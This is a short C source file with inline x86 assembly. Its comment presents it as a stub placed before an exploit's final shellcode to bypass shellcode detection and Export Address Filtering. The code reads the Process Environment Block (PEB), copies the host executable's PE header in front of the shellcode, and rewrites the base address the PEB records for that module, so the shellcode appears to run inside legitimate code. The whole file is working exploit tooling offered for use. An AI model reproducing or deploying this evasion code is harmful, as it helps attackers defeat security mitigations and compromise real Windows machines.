/*
for bypassing shellcode detection checks as well as EAF (EAF+ is not an issue)
detection is solely based on verifying whether caller segment is under loaded module's code & executable section
Thus if we simply change the base address of loaded ExE in PEB and prepend its PE header to ur shellcode EAF is bypassed

The following should be written before the final shellcode of an epxloit
*/
__asm
{
SUB ESP, 0x4000                     ; subtract ESP to gain some stack space (your choice)
MOV EAX, DWORD PTR FS: [30]         ; self explanatory
MOV EAX, DWORD PTR DS: [EAX+C] 
MOV EAX, DWORD PTR DS: [EAX+14] 
MOV ESI, DWORD PTR DS: [EAX+10]     ; Base address of loaded ExE in ESI
MOV ECX, 0x1000                     ; RVA offset to loaded ExE's Code&Executable section (for winword its 0x1000)
CALL next
next:
POP EDI                             ; gain EIP in EDI 
SUB EDI, 0x1019                     ; get EIP -0x1019 which would be starting of PE header,
                                    ; such that 1st instruction "sub esp,0x4000" comes at base + 0x1000 exact
REP MOVS BYTE PTR ES: [EDI] , BYTE PTR DS: [ESI] 
                                    ; slap PE header of loaded ExE before our code
ADD EAX, 10                         ; point to BaseAddress place holder in loaded modules link list
SUB EDI, 1000                       ; point EDI to DOS header part of PE header slapped before shellcode
MOV DWORD PTR DS: [EAX] , EDI       ; make changes in PEB
}
